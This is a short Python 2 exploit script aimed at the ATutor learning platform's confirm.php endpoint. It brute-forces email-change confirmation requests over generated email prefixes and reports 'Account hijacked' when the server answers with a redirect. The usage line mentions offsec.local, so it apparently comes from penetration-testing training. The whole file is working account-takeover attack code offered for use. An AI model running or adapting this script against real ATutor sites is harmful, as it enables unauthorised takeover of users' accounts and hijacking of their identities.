import hashlib, string, itertools, re, sys, requests

def gen_code(domain, id, prefix_length, url):
    for word in itertools.imap(''.join, itertools.product(string.lowercase,repeat=int(prefix_length))):
        email = "%s@%s" % (word, domain)
        full_url = "%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (url, email, id)
        r = requests.get(full_url, allow_redirects=False)
        print '[-] Issuing update request to URL: %s' % full_url
        if (r.status_code == 302):
            return (True, email)


def main():
    if len(sys.argv) != 5:
        print '[!] usage: %s <email_domain_name> <id> <prefix_length> <atutor_url>' % sys.argv[0]
        print '[!] eg: %s offsec.local 3 4 http://atutor-server.com' % sys.argv[0]
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]
    url = sys.argv[4]
    result, email = gen_code(domain, id, prefix_length, url)
    if(result):
        print "[+] Account hijacked w/ %s!" % email
    else:
        print "[!] Attack failed!  Try a larger prefix length..."
        sys.exit(2)
    

if __name__ == "__main__":
    main()